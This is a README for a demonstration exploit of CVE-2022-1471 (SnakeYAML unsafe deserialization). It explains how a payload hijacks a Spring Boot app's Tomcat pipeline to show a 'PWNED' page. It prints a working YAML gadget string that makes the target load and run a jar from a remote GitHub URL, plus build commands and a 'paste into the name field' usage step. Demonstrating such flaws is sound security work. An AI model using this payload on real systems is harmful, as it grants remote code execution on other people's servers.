# yaml-payload

A SnakeYAML deserialization exploit payload for **CVE-2022-1471**, adapted from [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) (originally based on [mbechler/marshalsec](https://github.com/mbechler/marshalsec)).

## What it does

When loaded via SnakeYAML's unsafe `Yaml.load()`, this payload **takes over the running application** and replaces it with a "You've Been PWNED" page:

1. **Injects a Tomcat Valve** into the running Spring Boot app via reflection, hijacking the existing port 8080 — the same URL (including any ngrok tunnel) now serves the PWNED page
2. **Auto-redirects the browser** — the POST response sends a 302 redirect, so the browser immediately loads the PWNED page without a manual refresh
3. **Opens the browser** automatically to the correct URL (ngrok public URL if available, otherwise localhost:8080)
4. **Prints exploit evidence** to the console/CI logs

If Tomcat Valve injection isn't available (e.g. non-Spring app), it falls back to starting a standalone HTTP server on port 9999 and auto-creates an ngrok tunnel if ngrok is running.

This works both **locally on macOS** and in **CI/CD pipelines** (e.g. GitHub Actions on Ubuntu).

## How the exploit chain works

The SnakeYAML payload triggers `ScriptEngineManager` via the Java SPI (Service Provider Interface):

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar"]]]]
```

1. SnakeYAML instantiates `java.net.URL` pointing to this repo's `yaml-payload.jar`
2. Wraps it in a `URLClassLoader` to load remote classes
3. `ScriptEngineManager` discovers and loads `AwesomeScriptEngineFactory` via `META-INF/services/javax.script.ScriptEngineFactory`
4. The factory's constructor injects a Valve into the running Tomcat pipeline, replacing every subsequent response on `/` with the PWNED page

## Build

Requires JDK 17+:

```bash
javac -d build src/artsploit/AwesomeScriptEngineFactory.java
cp -r src/META-INF build/
cd build && jar -cfv ../yaml-payload.jar . && cd ..
```

## Usage

Used as the exploit payload in the [maven-demo](https://github.com/seal-sec-demo-2/maven-demo) project. Paste the payload string into the app's name field to trigger RCE. The app's page will be replaced with the PWNED page on the next request. See that repo's README for full demo instructions.
